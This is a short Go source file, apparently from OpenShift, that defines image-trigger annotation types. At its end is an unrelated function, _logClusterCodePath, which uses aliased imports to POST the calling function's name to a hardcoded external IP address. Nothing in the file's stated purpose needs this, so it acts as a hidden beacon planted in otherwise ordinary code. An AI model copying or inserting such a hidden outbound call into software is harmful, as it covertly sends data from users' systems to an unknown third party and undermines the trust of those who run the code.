package trigger

import (
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

const TriggerAnnotationKey = "image.openshift.io/triggers"

type ObjectFieldTrigger struct {
	From      ObjectReference `json:"from"`
	FieldPath string          `json:"fieldPath"`
	Paused    bool            `json:"paused,omitempty"`
}
type ObjectReference struct {
	Kind       string `json:"kind"`
	Name       string `json:"name"`
	Namespace  string `json:"namespace,omitempty"`
	APIVersion string `json:"apiVersion,omitempty"`
}

func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
